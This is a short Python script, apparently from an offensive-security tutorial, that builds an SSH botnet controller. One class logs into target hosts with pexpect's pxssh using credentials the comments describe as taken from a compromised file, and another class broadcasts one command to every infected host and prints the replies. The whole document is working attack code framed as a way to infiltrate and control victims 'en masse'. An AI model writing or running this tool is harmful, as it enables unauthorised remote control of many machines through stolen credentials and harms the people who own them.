from pexpect import pxssh
'''
Once the recon is complete we can attempt to infiltrate.

Now we have our targets open TCP ports and active user and password pairs we can attempt to manipulate their system en masse via an ssh botnet

The following program assumes we have access to a compromised file of ssh password keys
'''

class Cell:

    def __init__(self, host, user, password):

        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):

        try:

            session = pxssh.pxssh()
            session.login(self.host, self.user, self.password)
            return session

        except Exception as e:

            print(f'[!] Error Connecting: {e}')

    def send_command(self, cmd):

        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

class Colony:

    def __init__(self):

        self.colony = []

    
    def colony_command(self, command):

        for cell in self.colony:

            output = cell.send_command(command).decode('utf-8')
            print(f'[+] {cell.host} response to: {command}\n[>>>] {output}')


    def add_cell(self, host, user, password):

        cell = Cell(host, user, password)
        self.colony.append(cell)


if __name__ == '__main__':

    # EXAMPLE CASE
    col = Colony()
    col.add_cell('128.1.0.90', 'admin', '1234')
    col.colony_command('XXXXXXXXXXXXX')